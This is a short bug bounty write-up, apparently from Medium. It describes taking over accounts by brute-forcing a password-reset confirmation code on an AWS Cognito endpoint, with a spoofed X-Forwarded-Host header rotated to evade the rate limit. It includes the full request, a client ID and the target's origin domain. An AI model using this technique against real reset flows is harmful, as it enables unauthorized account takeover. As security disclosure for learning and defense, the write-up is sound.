---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-03-18_account-takeover-with-rate-limit-bypass.md
original_filename: 2023-03-18_account-takeover-with-rate-limit-bypass.md
title: Account Takeover with rate limit bypass
category: documents
detected_topics:
- rate-limit
- command-injection
- otp
- cors
- cloud-security
tags:
- imported
- documents
- rate-limit
- command-injection
- otp
- cors
- cloud-security
language: en
raw_sha256: cc1a14cf148c5b95383d549c8d0ad827585f10c70aff17c938526725eb8b967d
text_sha256: 880864a27b36d25dbc4d0790555acf9addedd43e86d6d292e8b72b0f26bda8b1
ingested_at: '2026-06-28T07:32:19Z'
sensitivity: unknown
redactions_applied: false
---

# Account Takeover with rate limit bypass

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-03-18_account-takeover-with-rate-limit-bypass.md
- Source Type: markdown
- Detected Topics: rate-limit, command-injection, otp, cors, cloud-security
- Ingested At: 2026-06-28T07:32:19Z
- Redactions Applied: False
- Raw SHA256: `cc1a14cf148c5b95383d549c8d0ad827585f10c70aff17c938526725eb8b967d`
- Text SHA256: `880864a27b36d25dbc4d0790555acf9addedd43e86d6d292e8b72b0f26bda8b1`


## Content

---
title: "Account Takeover with rate limit bypass"
url: "https://medium.com/@shamimahamed666070/account-takeover-with-rate-limit-bypass-f28c5089a1eb"
authors: ["Shamim Ahamed (@itm4n)"]
bugs: ["Rate limiting bypass", "Account takeover"]
publication_date: "2023-03-18"
added_date: "2023-03-23"
source: "pentester.land/writeups.json"
original_index: 1359
scraped_via: "browseros"
---

# Account Takeover with rate limit bypass

Shamimahamed
Follow
2 min read
·
Mar 18, 2023

131

2

Account Takeover with rate limit bypass

Hi guys, I’m Shamim Ahamed . It’s my first bug bounty write-up about my valid bug which could have allowed a malicious user to take over any account on that target site.

Press enter or click to view image in full size

So let’s start

As I can’t disclose the name of the company, let’s call it “target.sultandine.com” .Last night i was testing on my target website ,and suddenly i notify something on forgotpassword to reset password option , so tried reset password and something in burp suite,the request like this

POST / HTTP/2
Host:target.sultandine.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: /
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://my.tomorrowland.com/
Content-Type: application/x-amz-json-1.1
X-Amz-Target: AWSCognitoIdentityProviderService.ConfirmForgotPassword
X-Amz-User-Agent: aws-amplify/5.0.4 js
Origin: https://my.tomorrowland.com
Content-Length: 128
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Te: trailers

{"ClientId":"1mf0i80fpuq6mqv5pmgpjb8veg","Username":"lasas28845@galcake.com","ConfirmationCode":"865732","Password":"shamim017"}

I tried to test on this and find a option ,there is a ConfirmationCode”:XXXX” which used to be change the password ,valid ConfirmationCode.

Get Shamimahamed’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

use burp suite intruder to brute force on ConfirmationCode.After sending request so many for brute force the code this it will blocking our request.

{"__type":"LimitExceededException","message":"Attempt limit exceeded, please try after some time."}

Then i tried to bypass this by using X-Forwared-Host: 127.0.0.1 on request .It’s successfully bypass limit.

use burp suite intruder to change multiple ip on X-Forwared-Host:127.0.0.$1$, and continue brute force on ConfirmationCode,after so many request the valid code change the password and successfully takeover the account .

Press enter or click to view image in full size

That’s all…

Thank you for reading!
